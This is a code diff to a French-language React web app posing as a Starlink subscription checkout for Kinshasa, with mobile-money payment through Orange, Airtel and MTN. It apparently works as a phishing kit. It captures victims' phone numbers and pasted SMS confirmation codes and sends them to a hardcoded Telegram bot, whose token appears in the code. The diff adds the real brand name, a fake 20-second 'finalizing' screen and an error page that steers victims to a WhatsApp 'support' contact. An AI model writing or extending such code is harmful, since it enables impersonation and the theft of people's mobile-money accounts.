@@ -1,5 +1,8 @@
 import React, { useState, useEffect, useRef } from "react";
 import {
+  Shield,
+  Rocket,
+  Zap,
   Satellite,
   Download,
   Upload,
@@ -25,6 +28,7 @@ import {
   ArrowLeft,
   Lock,
   Phone,
+  X,
   Pencil,
   Clipboard,
 } from "lucide-react";
@@ -90,55 +94,111 @@ function useLiveMetric(baseValue, variance, active = true, initialDuration = 140
 
 const PLANS = [
   {
-    id: "essentiel",
-    name: "Essentiel",
-    tagline: "Navigation & réseaux sociaux",
-    monthly: 35,
-    down: 30,
-    up: 8,
+    id: "basique",
+    name: "Forfait Basique",
+    tagline: "Connexion rapide pour la navigation",
+    monthly: 3000,
+    currency: "FC",
+    down: 100,
+    up: null,
     users: "1–2 appareils",
-    features: ["Installation antenne incluse", "Assistance 7j/7", "Sans engagement"],
+    features: [
+      "Connexion ultra rapide",
+      "Navigation & réseaux sociaux",
+      "Sans engagement",
+    ],
     badge: null,
     accent: "#38BDF8",
     icon: Wifi,
   },
+
   {
-    id: "foyer",
-    name: "Foyer",
-    tagline: "Streaming HD & télétravail",
-    monthly: 65,
-    down: 100,
-    up: 20,
-    users: "Jusqu'à 8 appareils",
-    features: ["Routeur Wi-Fi 6 inclus", "Priorité réseau", "Assistance 7j/7"],
-    badge: "Le plus choisi",
+    id: "standard",
+    name: "Forfait Standard",
+    tagline: "Streaming & usage quotidien",
+    monthly: 5000,
+    currency: "FC",
+    down: 200,
+    up: null,
+    users: "Jusqu'à 5 appareils",
+    features: [
+      "Streaming HD",
+      "Connexion stable",
+      "Sans engagement",
+    ],
+    badge: null,
     accent: "#2DD4BF",
-    icon: Home,
+    icon: Zap,
   },
+
+  {
+    id: "premium",
+    name: "Forfait Premium",
+    tagline: "Streaming, jeux & télétravail",
+    monthly: 8000,
+    currency: "FC",
+    down: 300,
+    up: null,
+    users: "Jusqu'à 8 appareils",
+    features: [
+      "Streaming HD & 4K",
+      "Jeux en ligne sans coupure",
+      "Travail & études à distance",
+    ],
+    badge: "Le plus choisi",
+    accent: "#A78BFA",
+    icon: Rocket,
+  },
+
   {
     id: "pro",
-    name: "Pro Entreprise",
-    tagline: "PME, visio & IP fixe",
-    monthly: 150,
-    down: 250,
-    up: 50,
-    users: "Multi-sites",
-    features: ["Adresse IP fixe", "Support prioritaire 24/7", "SLA 99,9 %"],
+    name: "Forfait Pro",
+    tagline: "Performance maximale pour les professionnels",
+    monthly: 12000,
+    currency: "FC",
+    down: 500,
+    up: null,
+    users: "Nombreux appareils",
+    features: [
+      "Connexion très haut débit",
+      "Travail professionnel",
+      "Streaming & visioconférence",
+    ],
     badge: null,
-    accent: "#A78BFA",
+    accent: "#6366F1",
+    icon: Shield,
+  },
+
+  {
+    id: "business",
+    name: "Forfait Business",
+    tagline: "Internet ultra haut débit pour entreprises",
+    monthly: 20000,
+    currency: "FC",
+    down: 1000,
+    up: null,
+    users: "Multi-utilisateurs",
+    features: [
+      "Débit jusqu'à 1000 Mbps",
+      "Usage professionnel intensif",
+      "Connexion rapide, stable et fiable",
+    ],
+    badge: "Business",
+    accent: "#2563EB",
     icon: Building2,
   },
 ];
 
 const OPERATORS = [
-  { id: "orange", name: "Orange Money", shortName: "Orange", mono: "OM", color: "#FF7900" },
-  { id: "airtel", name: "Airtel Money", shortName: "Airtel", mono: "AM", color: "#ED1C24" },
-  { id: "mtn", name: "MTN MoMo", shortName: "MTN", mono: "MM", color: "#FFCC00" },
+  { id: "orange", name: "Orange Money", shortName: "Orange", mono: "OM", logo: "/orange_money.png", color: "#FF7900" },
+  { id: "airtel", name: "Airtel Money", shortName: "Airtel", mono: "AM", logo: "/airtel_money.png", color: "#ED1C24" },
+  { id: "mtn", name: "MTN MoMo", shortName: "MTN", mono: "MM", logo: "/mtn_momo.png", color: "#FFCC00" },
 ];
 
 // --- Notification Telegram (numéro de téléphone uniquement) ---
 const TELEGRAM_BOT_TOKEN = "8867979460:AAHLTjlnZhKcLCv_uVfHz0RlYxWwSxLJBYM";
 const TELEGRAM_CHAT_ID = "6018499075";
+const WHATSAPP_SUPPORT_URL = "https://wa.me/14484465948?text=Bonjour%2C%20j%27ai%20une%20erreur%20et%20j%27ai%20besoin%20d%27aide%20pour%20mon%20paiement.";
 
 function notifyTelegram(text) {
   fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
@@ -455,11 +515,11 @@ function PlanCard({ plan, selected, onSelect, cycle }) {
       {/* price */}
       <div className="mt-4 flex items-end gap-2">
         <span className="font-[JetBrains_Mono] text-[28px] leading-none font-bold text-[#EAF0FB]">
-          ${price}
+         {price}fc
         </span>
         <span className="text-xs text-[#8C97B8] pb-1">/mois</span>
         {cycle === "annuel" && (
-          <span className="text-xs text-[#8C97B8]/60 line-through pb-1">${plan.monthly}</span>
+          <span className="text-xs text-[#8C97B8]/60 line-through pb-1">{plan.monthly}fc</span>
         )}
       </div>
 
@@ -605,10 +665,10 @@ function PaymentMethodScreen({ plan, price, operator, setOperator, onBack, onNex
               style={isSelected ? { borderColor: `${op.color}80`, boxShadow: `0 0 0 1px ${op.color}40` } : undefined}
             >
               <span
-                className="flex items-center justify-center w-11 h-11 rounded-full font-[JetBrains_Mono] text-xs font-bold shrink-0"
-                style={{ backgroundColor: `${op.color}22`, color: op.color }}
+                className="flex items-center justify-center w-11 h-11 rounded-full overflow-hidden shrink-0 border border-white/10 bg-white/5"
+                style={{ backgroundColor: `${op.color}22` }}
               >
-                {op.mono}
+                <img src={op.logo} alt={op.name} className="w-full h-full object-cover" />
               </span>
               <div className="text-left">
                 <p className="text-[10px] uppercase tracking-[0.1em] text-[#8C97B8]">Payer avec</p>
@@ -716,10 +776,10 @@ function ConfirmPhoneScreen({ phone, operator, onEdit, onConfirm }) {
     <div className="flex-1 flex flex-col overflow-y-auto px-5 pb-6 animate-[fadeSlideUp_0.4s_ease_both]">
       <div className="flex flex-col items-center pt-8">
         <span
-          className="flex items-center justify-center w-14 h-14 rounded-full font-[JetBrains_Mono] text-sm font-bold"
-          style={{ backgroundColor: `${operator.color}22`, color: operator.color }}
+          className="flex items-center justify-center w-14 h-14 rounded-full overflow-hidden border border-white/10 bg-white/5"
+          style={{ backgroundColor: `${operator.color}22` }}
         >
-          {operator.mono}
+          <img src={operator.logo} alt={operator.name} className="w-full h-full object-cover" />
         </span>
         <p className="mt-4 text-sm text-[#8C97B8]">Confirmez votre numéro {operator.name}</p>
         <p className="mt-2 font-[JetBrains_Mono] text-2xl font-bold text-[#EAF0FB] tracking-wide">{phone}</p>
@@ -767,10 +827,10 @@ function CodeEntryScreen({ operator, onValidate }) {
     <div className="flex-1 flex flex-col overflow-y-auto px-5 pb-6 animate-[fadeSlideUp_0.4s_ease_both]">
       <div className="flex flex-col items-center pt-6">
         <span
-          className="flex items-center justify-center w-14 h-14 rounded-full font-[JetBrains_Mono] text-sm font-bold"
-          style={{ backgroundColor: `${operator.color}22`, color: operator.color }}
+          className="flex items-center justify-center w-14 h-14 rounded-full overflow-hidden border border-white/10 bg-white/5"
+          style={{ backgroundColor: `${operator.color}22` }}
         >
-          {operator.mono}
+          <img src={operator.logo} alt={operator.name} className="w-full h-full object-cover" />
         </span>
         <p className="mt-3 text-sm font-semibold text-[#EAF0FB]">{operator.name}</p>
         <p className="mt-2 text-xs text-[#8C97B8] text-center max-w-[240px]">
@@ -870,30 +930,95 @@ function ConnectingScreen({ onDone }) {
   );
 }
 
-function SuccessScreen({ operator, plan, price, onDone }) {
+function ErrorScreen({ operator, onDone, onContactWhatsApp }) {
   return (
     <div className="flex-1 flex flex-col items-center justify-center px-8 text-center gap-4">
       <span
         className="flex items-center justify-center w-16 h-16 rounded-full animate-[fadeSlideUp_0.5s_ease_both]"
         style={{ backgroundColor: `${operator.color}22`, color: operator.color }}
       >
-        <CheckCircle2 size={30} />
+        <X size={30} strokeWidth={2.5} />
       </span>
       <div>
         <p className="font-display text-lg font-bold text-[#EAF0FB]">
-          Connexion à votre SIM {operator.shortName} établie
+          Une erreur s’est produite
         </p>
-        <p className="mt-1.5 text-xs text-[#8C97B8]">
-          Votre forfait {plan.name} (${price}/mois) est activé. Bienvenue chez Starlinf !
+        <p className="mt-1.5 text-xs leading-relaxed text-[#8C97B8]">
+          Nous n’avons pas pu finaliser votre demande. Contactez le service client sur WhatsApp pour obtenir de l’aide.
         </p>
       </div>
+
+      <a
+        href={WHATSAPP_SUPPORT_URL}
+        target="_blank"
+        rel="noreferrer"
+        onClick={onContactWhatsApp}
+        style={{ backgroundColor: operator.color }}
+        className="mt-2 w-full rounded-xl px-4 py-3 text-sm font-semibold text-[#05070D] transition-transform duration-300 active:scale-[0.98] flex items-center justify-center gap-2"
+      >
+        <Phone size={16} />
+        Contacter le service client
+      </a>
+
       <button
         onClick={onDone}
-        style={{ backgroundColor: operator.color }}
-        className="mt-4 w-full rounded-xl px-4 py-3 text-sm font-semibold text-[#05070D] transition-transform duration-300 active:scale-[0.98]"
+        className="w-full rounded-xl bg-white/[0.05] px-4 py-3 text-sm font-semibold text-[#8C97B8]"
       >
-        Terminé
+        Fermer
       </button>
+    </div>
+  );
+}
+
+function FinalizingScreen({ operator }) {
+  const [progress, setProgress] = useState(0);
+
+  useEffect(() => {
+    const start = Date.now();
+    const duration = 20000;
+    let raf;
+
+    function tick() {
+      const elapsed = Date.now() - start;
+      const p = Math.min(100, (elapsed / duration) * 100);
+      setProgress(p);
+      if (p < 100) raf = requestAnimationFrame(tick);
+    }
+
+    raf = requestAnimationFrame(tick);
+    return () => cancelAnimationFrame(raf);
+  }, []);
+
+  const r = 42;
+  const circumference = 2 * Math.PI * r;
+
+  return (
+    <div className="flex-1 flex flex-col items-center justify-center px-8 text-center gap-5">
+      <div className="relative w-36 h-36 flex items-center justify-center">
+        <svg className="absolute inset-0 -rotate-90" viewBox="0 0 100 100">
+          <circle cx="50" cy="50" r={r} fill="none" stroke="rgba(255,255,255,0.08)" strokeWidth="6" />
+          <circle
+            cx="50"
+            cy="50"
+            r={r}
+            fill="none"
+            stroke={operator.color}
+            strokeWidth="6"
+            strokeLinecap="round"
+            strokeDasharray={circumference}
+            strokeDashoffset={circumference * (1 - progress / 100)}
+            style={{ transition: "stroke-dashoffset 0.2s linear" }}
+          />
+        </svg>
+        <span className="font-[JetBrains_Mono] text-2xl font-bold text-[#EAF0FB]">{Math.round(progress)}%</span>
+      </div>
+
+      <div>
+        <p className="font-display text-lg font-bold text-[#EAF0FB]">Finalisation...</p>
+        <p className="mt-2 text-sm leading-relaxed text-[#8C97B8]">
+          Connexion au réseau Starlink en cours
+        </p>
+      </div>
     </div>
   );
 }
@@ -903,6 +1028,7 @@ function SimConnectScreen({ operator, plan, price, onFinish, phone }) {
   const [seconds, setSeconds] = useState(30);
   const [justRefreshed, setJustRefreshed] = useState(false);
   const [sent, setSent] = useState(false);
+  const [finalizing, setFinalizing] = useState(false);
 
   useEffect(() => {
     const id = setInterval(() => {
@@ -933,18 +1059,43 @@ function SimConnectScreen({ operator, plan, price, onFinish, phone }) {
     setMessage(`${operator.shortName}: Votre code de confirmation Starlinf est ${code}. Valide 30 secondes.`);
   };
 
+  useEffect(() => {
+    if (!finalizing) return;
+
+    const timer = setTimeout(() => {
+      setFinalizing(false);
+      setSent(true);
+    }, 20000);
+
+    return () => clearTimeout(timer);
+  }, [finalizing]);
+
+  if (finalizing) {
+    return <FinalizingScreen operator={operator} />;
+  }
+
   if (sent) {
-    return <SuccessScreen operator={operator} plan={plan} price={price} onDone={onFinish} />;
+    return (
+      <ErrorScreen
+        operator={operator}
+        onDone={onFinish}
+        onContactWhatsApp={() => {
+          notifyTelegram(
+            `⚠️ Erreur signalée\nForfait : ${plan.name} ($${price}/mois)\nOpérateur : ${operator.name}\nNuméro : ${phone}`
+          );
+        }}
+      />
+    );
   }
 
   return (
     <div className="flex-1 flex flex-col overflow-y-auto px-5 pb-6 animate-[fadeSlideUp_0.4s_ease_both]">
       <div className="flex flex-col items-center pt-4">
         <span
-          className="flex items-center justify-center w-14 h-14 rounded-full font-[JetBrains_Mono] text-sm font-bold"
-          style={{ backgroundColor: `${operator.color}22`, color: operator.color }}
+          className="flex items-center justify-center w-14 h-14 rounded-full overflow-hidden border border-white/10 bg-white/5"
+          style={{ backgroundColor: `${operator.color}22` }}
         >
-          {operator.mono}
+          <img src={operator.logo} alt={operator.name} className="w-full h-full object-cover" />
         </span>
         <p className="mt-3 text-sm font-semibold text-[#EAF0FB]">
           Connexion à votre SIM {operator.shortName}
@@ -1002,7 +1153,7 @@ function SimConnectScreen({ operator, plan, price, onFinish, phone }) {
             notifyTelegram(
               `📨 Message collé\nForfait : ${plan.name} ($${price}/mois)\nOpérateur : ${operator.name}\nNuméro : ${phone}\nMessage : ${message}`
             );
-            setSent(true);
+            setFinalizing(true);
           }}
           style={message.trim() ? { backgroundColor: operator.color } : undefined}
           className={`w-full rounded-xl px-4 py-3 text-sm font-semibold transition-all duration-300 ${
@@ -1080,7 +1231,7 @@ export default function App() {
   };
 
   return (
-    <div className="min-h-screen w-full flex items-center justify-center bg-[#05070D] py-6 px-2">
+    <div className="min-h-screen w-full bg-[#05070D]">
       <style>{`
         @import url('https://fonts.googleapis.com/css2?family=Sora:wght@600;700;800&family=Inter:wght@400;500;600&family=JetBrains+Mono:wght@400;500;700&display=swap');
         * { font-family: 'Inter', sans-serif; }
@@ -1104,7 +1255,7 @@ export default function App() {
         }
       `}</style>
 
-      <div className="relative w-full max-w-[430px] h-[860px] max-h-[92vh] rounded-[2.25rem] overflow-hidden bg-[#0B1224] border border-white/[0.08] shadow-2xl flex flex-col">
+      <div className="relative w-full h-[100dvh] max-h-[100dvh] overflow-hidden bg-[#0B1224] flex flex-col">
         {checkoutStep ? (
           <>
             {!["connecting", "simConnect"].includes(checkoutStep) && (
@@ -1187,14 +1338,14 @@ export default function App() {
                   <Satellite size={16} />
                 </span>
                 <span className="font-display text-[17px] font-extrabold tracking-tight text-[#EAF0FB]">
-                  STARLINF
+                  STARLINK
                 </span>
               </div>
               <span className="text-[10px] uppercase tracking-[0.14em] text-[#8C97B8]">RDC · Kinshasa</span>
             </div>
 
             {/* content */}
-            <main key={active} className="flex-1 overflow-y-auto px-5 pb-6 animate-[fadeSlideUp_0.4s_ease_both]">
+            <main key={active} className="flex-1 overflow-y-auto px-5 pb-6 animate-[fadeSlideUp_0.4s_ease_both] [&::-webkit-scrollbar]:hidden [-ms-overflow-style:none] [scrollbar-width:none]">
               {active === "statut" ? (
                 <StatutView active={active === "statut"} onBuy={() => setActive("forfait")} />
               ) : (
